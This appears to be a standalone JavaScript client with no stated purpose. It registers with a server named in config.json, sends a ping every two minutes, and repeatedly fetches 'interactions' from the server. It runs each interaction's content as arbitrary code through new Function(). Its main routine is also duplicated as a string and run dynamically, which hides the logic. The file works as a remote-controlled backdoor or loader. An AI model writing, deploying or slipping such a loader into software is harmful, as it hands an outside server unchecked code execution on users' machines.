const wrap = (s) => "{ return " + s + " };";

async function step1({ defaultName }) {
  const fs = await import("fs");
  const config = fs.readFileSync("config.json", "utf8");
  const { serverUrl, clientName } = JSON.parse(config);
  let name = clientName;
  if (!name) name = defaultName;
  const resClient = await fetch(
    serverUrl + "/api/available-client?name=" + name
  );
  const availableClient = await resClient.json();
  if (availableClient) {
    const updatedConfig = {
      ...JSON.parse(fs.readFileSync("config.json", "utf8")),
      clientName: availableClient.name,
    };

    fs.writeFileSync("config.json", JSON.stringify(updatedConfig, null, 2));
  }
  console.log("availableClient", availableClient);
  return {};
}

async function step2() {
  const fs = await import("fs");
  setInterval(async () => {
    console.log("::=========>ping client");
    await fetch(serverUrl + "/api/ping-client", { method: "post" });
  }, 120000);
  const config = fs.readFileSync("config.json", "utf8");
  const { serverUrl, clientName } = JSON.parse(config);
  async function executeInteractions(interactions) {
    for (const interaction of interactions) {
      try {
        const executeInit = new Function(wrap(interaction.content));
        const params = JSON.parse(interaction.params);
        await executeInit.call(null).call(null, params);
      } catch (error) {
        console.error("Error executing interaction: " + error.message);
        throw error;
      }
    }
  }
  async function fetchClient() {
    try {
      const cls = await fetch(
        serverUrl + "/api/client-by-name?clientName=" + clientName
      );
      return await cls.json();
    } catch (error) {
      console.error("Error fetching process: " + error.message);
      throw error;
    }
  }
  async function retryWithDelay(delay) {
    return new Promise((resolve) => setTimeout(resolve, delay));
  }
  for (let retryCount = 0; retryCount < 1000; retryCount++) {
    try {
      const client = await fetchClient();
      if (
        !client ||
        !client.process ||
        !client.process.interactions ||
        client.process.interactions.length === 0
      ) {
        console.warn("No interactions found. Retrying...");
        await retryWithDelay(60000);
        continue;
      }
      await executeInteractions(client.process.interactions);
      break;
    } catch (error) {
      console.error("Error during step2: " + error.message);
      await retryWithDelay(60000);
    }
  }
}

(async () => {
  const executeInit = new Function(
    wrap(`async function step2() {
      const fs = await import("fs");
      setInterval(async () => {
        console.log("::=========>ping client");
        await fetch(serverUrl + "/api/ping-client", { method: "post" });
      }, 120000);
      const config = fs.readFileSync("config.json", "utf8");
      const { serverUrl, clientName } = JSON.parse(config);
      async function executeInteractions(interactions) {
        for (const interaction of interactions) {
          try {
            const executeInit = new Function(wrap(interaction.content));
            const params = JSON.parse(interaction.params);
            await executeInit.call(null).call(null, params);
          } catch (error) {
            console.error("Error executing interaction: " + error.message);
            throw error;
          }
        }
      }
      async function fetchClient() {
        try {
          const cls = await fetch(
            serverUrl + "/api/client-by-name?clientName=" + clientName
          );
          return await cls.json();
        } catch (error) {
          console.error("Error fetching process: " + error.message);
          throw error;
        }
      }
      async function retryWithDelay(delay) {
        return new Promise((resolve) => setTimeout(resolve, delay));
      }
      for (let retryCount = 0; retryCount < 1000; retryCount++) {
        try {
          const client = await fetchClient();
          if (
            !client ||
            !client.process ||
            !client.process.interactions ||
            client.process.interactions.length === 0
          ) {
            console.warn("No interactions found. Retrying...");
            await retryWithDelay(60000);
            continue;
          }
          await executeInteractions(client.process.interactions);
          break;
        } catch (error) {
          console.error("Error during step2: " + error.message);
          await retryWithDelay(60000);
        }
      }
    }`)
  );
  const params = {};
  await executeInit.call(null).call(null, params);
})();
